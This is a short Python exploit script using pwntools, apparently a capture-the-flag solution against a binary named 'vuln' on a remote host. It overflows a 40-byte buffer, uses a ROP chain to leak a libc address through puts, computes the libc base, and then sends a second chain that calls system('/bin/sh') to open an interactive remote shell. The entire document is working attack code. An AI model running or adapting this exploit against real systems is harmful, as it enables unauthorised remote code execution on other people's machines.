from pwn import *
elf = context.binary = ELF('./vuln',checksec=False)
libc = ELF('./libc.so.6')
#p = process('./vuln')
p = remote('34.125.199.248',6969)
rop = ROP(elf)
rop.puts(elf.got.gets)
rop.main()

payload = b'A'*40
payload += rop.chain()
p.recvuntil(b'password: \n')
p.sendline(payload)

p.recvuntil(b'password\n\n')
#print(p.recvline().strip())
leak = u64(p.recvline().strip().ljust(8,b'\x00'))
libc.address = leak - libc.sym.gets
print(hex(leak))
print(hex(libc.address))
binsh = next(libc.search(b'/bin/sh'))
rop1 = ROP(libc)
rop1.call(rop.find_gadget(['ret'])[0])
rop1.system(binsh)
payload = b'A'*40
payload += rop1.chain()
p.sendline(payload)
p.interactive()
